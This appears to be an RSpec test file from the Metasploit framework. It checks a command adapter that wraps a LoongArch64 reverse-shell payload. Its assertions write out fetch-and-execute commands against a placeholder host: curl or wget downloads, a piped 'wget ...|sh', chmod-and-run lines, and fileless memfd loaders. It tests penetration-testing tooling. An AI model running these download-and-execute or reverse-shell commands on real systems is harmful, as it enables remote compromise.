require 'spec_helper'

RSpec.describe 'cmd/linux/http/loongarch64' do
  include_context 'Msf::Simple::Framework#modules loading'

  subject(:payload) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'cmd/linux/http/loongarch64/shell_reverse_tcp',
      ancestor_reference_names: [
        'adapters/cmd/linux/http/loongarch64',
        'singles/linux/loongarch64/shell_reverse_tcp'
      ]
    )
  end

  before do
    payload.datastore.merge!(
      'LHOST' => '192.0.2.1', 'LPORT' => 4444, 'VERBOSE' => true,
      'FETCH_URIPATH' => 'payload', 'FETCH_FILENAME' => 'payload',
      'FETCH_WRITABLE_DIR' => '/tmp'
    )
  end

  it 'combines the command adapter with a LoongArch reverse shell' do
    expect(payload.arch).to eq([ARCH_CMD])
    expect(payload.send(:module_info)['AdaptedArch']).to eq(ARCH_LOONGARCH64)
    expect(payload.generate).to include('curl -so /tmp/payload http://192.0.2.1:8080/payload')
    resource = payload.instance_variable_get(:@srv_resources).first
    expect(resource[:data][0, 6]).to eq("\x7fELF\x02\x01".b)
    expect(resource[:data][18, 2].unpack1('v')).to eq(258) # EM_LOONGARCH
  end

  it 'serves both the command and ELF when piping to the shell' do
    payload.datastore.merge!('FETCH_COMMAND' => 'WGET', 'FETCH_PIPE' => true)
    expect(payload.generate).to eq('wget -qO- http://192.0.2.1:8080/payload|sh')
    resources = payload.instance_variable_get(:@srv_resources)
    expect(resources.length).to eq(2)
    expect(resources.last[:data]).to include('chmod +x /tmp/payload')
    expect(resources.map { |resource| resource[:uri] }.uniq.length).to eq(2)
    expect(resources.last[:data]).to include("http://192.0.2.1:8080/#{resources.first[:uri]}")
  end

  it 'serves the generated reverse shell inside the ELF' do
    raw_payload = load_and_create_module(
      module_type: 'payload',
      reference_name: 'linux/loongarch64/shell_reverse_tcp',
      ancestor_reference_names: ['singles/linux/loongarch64/shell_reverse_tcp']
    )
    raw_payload.datastore.merge!('LHOST' => '192.0.2.1', 'LPORT' => 4444, 'VERBOSE' => true)
    payload.generate
    binary = payload.instance_variable_get(:@srv_resources).first[:data]
    expect(binary).to end_with(raw_payload.generate)
  end

  it 'replaces the served payload when regenerated for a different callback' do
    payload.generate
    original = payload.instance_variable_get(:@srv_resources).first[:data]
    payload.datastore['LPORT'] = 4481
    payload.generate
    resources = payload.instance_variable_get(:@srv_resources)
    expect(resources.length).to eq(1)
    expect(resources.first[:data]).not_to eq(original)
  end

  { 'CURL' => 'curl -so /tmp/payload', 'WGET' => 'wget -qO /tmp/payload', 'GET' => 'GET -m GET' }.each do |command, prefix|
    it "generates an executable download command using #{command}" do
      payload.datastore['FETCH_COMMAND'] = command
      generated = payload.generate
      expect(generated).to start_with(prefix)
      expect(generated).to include('http://192.0.2.1:8080/payload')
      expect(generated).to end_with(';chmod +x /tmp/payload;/tmp/payload&')
    end
  end

  it 'uses a memfd for Python fileless execution' do
    payload.datastore['FETCH_FILELESS'] = 'python3.8+'
    expect(payload.generate).to include('os.memfd_create(', '/proc/{os.getpid()}/fd/{fd}')
  end

  it 'provides a disk fallback for shell-search execution' do
    payload.datastore['FETCH_FILELESS'] = 'shell-search'
    expect(payload.generate).to include('find /proc/$i/fd', 'then f=/tmp/payload;', 'chmod +x $f')
  end

  it 'embeds the LoongArch memfd loader in the fileless shell command' do
    payload.datastore['FETCH_FILELESS'] = 'shell'
    command = payload.generate
    encoded_stage = command.match(/\Aecho -n '([^']+)'/)[1]
    stage = Base64.strict_decode64(encoded_stage)
    shellcode = stage.match(/sc='([0-9a-f]+)'/)[1]
    expect([shellcode].pack('H*')).to eq(payload._generate_first_stage_shellcode(ARCH_LOONGARCH64))
    expect(stage).to include('0c0000188c41c0288001004c00004003')
    expect(command).not_to include('/tmp/payload')
  end
end
